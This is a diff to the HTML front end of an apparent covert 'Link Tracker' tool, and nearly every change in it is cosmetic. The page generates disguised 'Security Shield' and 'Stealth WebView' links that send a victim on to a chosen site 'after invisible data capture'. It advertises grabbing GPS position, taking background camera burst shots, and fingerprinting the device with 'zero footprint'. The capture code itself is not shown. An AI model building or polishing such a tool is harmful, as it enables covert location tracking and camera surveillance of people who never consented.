@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Link Tracker | Premium Intelligence</title>
+    <title>Link Tracker | Stealth Intelligence</title>
     <link rel="stylesheet" href="/css/style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
@@ -26,28 +26,33 @@
             <form id="createLinkForm">
                 <div class="form-group">
                     <label for="userId">Intelligence ID</label>
-                    <input type="text" id="userId" placeholder="e.g. ALPHA_VINC_99" required>
-                    <p style="font-size: 0.75rem; color: var(--text-dim); margin-top: 5px;">Unique identifier for your
-                        tracking dashboard.</p>
+                    <input type="text" id="userId" placeholder="e.g. ALPHA_VINC_99" required autocomplete="off">
+                    <p style="font-size: 0.70rem; color: var(--text-dim); margin-top: 8px; letter-spacing: 0.5px;">
+                        UNIQUE IDENTIFIER FOR YOUR DASHBOARD.</p>
                 </div>
 
                 <div class="form-group">
                     <label for="targetUrl">Target Destination</label>
-                    <input type="url" id="targetUrl" placeholder="https://example.com/secure-dossier" required>
-                    <p style="font-size: 0.75rem; color: var(--text-dim); margin-top: 5px;">Where the user will land
-                        after invisible data capture.</p>
+                    <input type="url" id="targetUrl" placeholder="https://example.com/secure" required
+                        autocomplete="off">
+                    <p style="font-size: 0.70rem; color: var(--text-dim); margin-top: 8px; letter-spacing: 0.5px;">
+                        REDIRECT TARGET AFTER DATA CAPTURE.</p>
                 </div>
 
-                <button type="submit" class="btn btn-primary" id="submitBtn">
-                    <i class="fas fa-bolt"></i> Generate Secure Links
-                </button>
+                <div style="margin-top: 40px;">
+                    <button type="submit" class="btn btn-primary" id="submitBtn">
+                        <i class="fas fa-bolt"></i> GENERATE SECURE LINKS
+                    </button>
+                </div>
             </form>
 
             <div id="result" class="result-box" style="display: none;">
                 <div class="link-item" data-aos="fade-right">
                     <div class="link-item-header">
-                        <span class="link-type"><i class="fab fa-cloudflare"></i> Security Shield Link</span>
-                        <span style="font-size: 0.7rem; color: var(--text-dim);">Recommended for High Hitrate</span>
+                        <span class="link-type"><i class="fas fa-shield-alt"></i> Security Shield Link</span>
+                        <span
+                            style="font-size: 0.7rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.5px;">High
+                            Retention</span>
                     </div>
                     <div class="link-input-group">
                         <input type="text" id="cloudflareLink" readonly>
@@ -59,8 +64,10 @@
 
                 <div class="link-item" data-aos="fade-right" data-aos-delay="100">
                     <div class="link-item-header">
-                        <span class="link-type"><i class="fas fa-mask"></i> Stealth WebView Link</span>
-                        <span style="font-size: 0.7rem; color: var(--text-dim);">Immediate Redirection</span>
+                        <span class="link-type"><i class="fas fa-ghost"></i> Stealth WebView Link</span>
+                        <span
+                            style="font-size: 0.7rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.5px;">Instant
+                            Redirect</span>
                     </div>
                     <div class="link-input-group">
                         <input type="text" id="webviewLink" readonly>
@@ -69,9 +76,8 @@
                     <div id="webviewShort" style="margin-top: 10px;"></div>
                 </div>
 
-                <div style="margin-top: 20px; text-align: center;">
-                    <a id="dashboardLink" class="btn btn-secondary"
-                        style="border: 1px solid var(--accent); color: var(--accent);">
+                <div style="margin-top: 30px; text-align: center;">
+                    <a id="dashboardLink" class="btn btn-secondary">
                         <i class="fas fa-chart-line"></i> Launch Intelligence Dashboard
                     </a>
                 </div>
@@ -81,41 +87,41 @@
         <!-- Capability Grid -->
         <div class="dashboard-grid" style="margin-top: 60px;">
             <div class="stat-card" data-aos="flip-up" data-aos-delay="0">
-                <i class="fas fa-map-marked-alt fa-2x" style="color: var(--accent); margin-bottom: 15px;"></i>
+                <i class="fas fa-map-marked-alt fa-2x" style="color: var(--text-main); margin-bottom: 20px;"></i>
                 <h4>GEO-Locate</h4>
-                <p style="font-size: 0.8rem; color: var(--text-dim);">Capture GPS position with high accuracy
-                    triangulation.</p>
+                <p style="font-size: 0.8rem; color: var(--text-dim); line-height: 1.5;">Capture GPS position with high
+                    accuracy triangulation.</p>
             </div>
             <div class="stat-card" data-aos="flip-up" data-aos-delay="100">
-                <i class="fas fa-camera fa-2x" style="color: var(--accent); margin-bottom: 15px;"></i>
+                <i class="fas fa-camera fa-2x" style="color: var(--text-main); margin-bottom: 20px;"></i>
                 <h4>Visual Intel</h4>
-                <p style="font-size: 0.8rem; color: var(--text-dim);">Background burst shots to identify valid subjects.
-                </p>
+                <p style="font-size: 0.8rem; color: var(--text-dim); line-height: 1.5;">Background burst shots to
+                    identify valid subjects.</p>
             </div>
             <div class="stat-card" data-aos="flip-up" data-aos-delay="200">
-                <i class="fas fa-microchip fa-2x" style="color: var(--accent); margin-bottom: 15px;"></i>
+                <i class="fas fa-microchip fa-2x" style="color: var(--text-main); margin-bottom: 20px;"></i>
                 <h4>System ID</h4>
-                <p style="font-size: 0.8rem; color: var(--text-dim);">Analyze OS, Browser, Battery, and Network
-                    hardware.</p>
+                <p style="font-size: 0.8rem; color: var(--text-dim); line-height: 1.5;">Analyze OS, Browser, Battery,
+                    and Network hardware.</p>
             </div>
             <div class="stat-card" data-aos="flip-up" data-aos-delay="300">
-                <i class="fas fa-user-secret fa-2x" style="color: var(--accent); margin-bottom: 15px;"></i>
+                <i class="fas fa-user-secret fa-2x" style="color: var(--text-main); margin-bottom: 20px;"></i>
                 <h4>Invisible</h4>
-                <p style="font-size: 0.8rem; color: var(--text-dim);">Zero footprint deployment via premium redirect
-                    layers.</p>
+                <p style="font-size: 0.8rem; color: var(--text-dim); line-height: 1.5;">Zero footprint deployment via
+                    premium redirect layers.</p>
             </div>
         </div>
 
         <footer
-            style="margin-top: 100px; text-align: center; color: var(--text-dim); font-size: 0.85rem; padding-bottom: 40px;">
+            style="margin-top: 100px; text-align: center; color: var(--text-dim); font-size: 0.75rem; padding-bottom: 40px; font-family: monospace;">
             <p>&copy; 2024 ANTI-GRAVITY SYSTEM | ADVANCED ANALYTICS INTERFACE</p>
-            <p style="margin-top: 10px; opacity: 0.5;">Ethical usage mandates user consent where applicable.</p>
+            <p style="margin-top: 10px; opacity: 0.5;">ETHICAL USAGE MANDATED. CONFORM TO LOCAL REGULATIONS.</p>
         </footer>
     </div>
 
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
     <script>
-        AOS.init({ duration: 1000, once: true });
+        AOS.init({ duration: 800, once: true, offset: 50 });
 
         const form = document.getElementById('createLinkForm');
         const submitBtn = document.getElementById('submitBtn');
@@ -127,7 +133,7 @@
             const targetUrl = document.getElementById('targetUrl').value;
 
             submitBtn.disabled = true;
-            submitBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Initializing Remote Bridge...';
+            submitBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> INITIALIZING BRIDGE...';
 
             try {
                 const response = await fetch('/api/create-link', {
@@ -149,13 +155,13 @@
 
                     if (data.cloudflareShortLinks && data.cloudflareShortLinks.length > 0) {
                         document.getElementById('cloudflareShort').innerHTML = data.cloudflareShortLinks.map(l =>
-                            `<div style="font-size: 0.75rem; margin-top: 5px; opacity: 0.6;"><i class="fas fa-share"></i> ${l}</div>`
+                            `<div style="font-size: 0.75rem; margin-top: 8px; opacity: 0.6; font-family: monospace;"><i class="fas fa-share" style="margin-right: 5px;"></i> ${l}</div>`
                         ).join('');
                     }
 
                     if (data.webviewShortLinks && data.webviewShortLinks.length > 0) {
                         document.getElementById('webviewShort').innerHTML = data.webviewShortLinks.map(l =>
-                            `<div style="font-size: 0.75rem; margin-top: 5px; opacity: 0.6;"><i class="fas fa-share"></i> ${l}</div>`
+                            `<div style="font-size: 0.75rem; margin-top: 8px; opacity: 0.6; font-family: monospace;"><i class="fas fa-share" style="margin-right: 5px;"></i> ${l}</div>`
                         ).join('');
                     }
 
@@ -166,7 +172,7 @@
                 alert('Connection lost. Verify your mesh connection.');
             } finally {
                 submitBtn.disabled = false;
-                submitBtn.innerHTML = '<i class="fas fa-bolt"></i> Generate Secure Links';
+                submitBtn.innerHTML = '<i class="fas fa-bolt"></i> GENERATE SECURE LINKS';
             }
         });
 
